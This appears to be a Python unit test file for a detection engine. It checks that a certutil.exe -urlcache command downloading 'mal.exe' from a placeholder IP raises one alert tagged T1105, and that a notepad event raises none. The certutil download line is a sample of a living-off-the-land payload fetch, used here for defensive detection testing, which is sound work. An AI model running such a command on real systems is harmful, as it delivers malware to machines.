import unittest
from engine.sigma_evaluator import build_default_engine

class TestDetectionEngine(unittest.TestCase):
    def setUp(self):
        self.engine = build_default_engine()

    def test_certutil_detection(self):
        event = {"host": "wk-1", "command_line": "certutil.exe -urlcache -f http://198.51.100.1/mal.exe"}
        alerts = self.engine.analyze(event)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["mitre_tag"], "T1105")

    def test_benign_event_pass(self):
        event = {"host": "wk-1", "command_line": "notepad.exe C:\\notes.txt"}
        alerts = self.engine.analyze(event)
        self.assertEqual(len(alerts), 0)

if __name__ == "__main__":
    unittest.main()
